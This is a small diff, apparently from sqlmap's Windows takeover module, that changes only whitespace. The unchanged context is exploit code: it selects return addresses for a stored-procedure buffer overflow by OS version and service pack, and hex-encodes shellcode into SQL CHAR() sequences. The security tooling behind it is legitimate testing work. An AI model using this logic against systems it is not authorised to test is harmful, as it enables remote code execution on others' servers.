@@ -53,7 +53,7 @@ class Takeover(GenericTakeover):
 
         for versionSp, data in returns.items():
             version, sp = versionSp.split("-")
-            sp          = int(sp)
+            sp = int(sp)
 
             if kb.osVersion == version and kb.osSP == sp:
                 addrs = data
@@ -61,14 +61,14 @@ class Takeover(GenericTakeover):
                 break
 
         if addrs is None:
-            errMsg  = "sqlmap can not exploit the stored procedure buffer "
+            errMsg = "sqlmap can not exploit the stored procedure buffer "
             errMsg += "overflow because it does not have a valid return "
             errMsg += "code for the underlying operating system (Windows "
             errMsg += "%s Service Pack %d)" % (kb.osVersion, kb.osSP)
             raise sqlmapUnsupportedFeatureException(errMsg)
 
         shellcodeChar = ""
-        hexStr        = binascii.hexlify(self.shellcodeString[:-1])
+        hexStr = binascii.hexlify(self.shellcodeString[:-1])
 
         for hexPair in range(0, len(hexStr), 2):
             shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair+2]
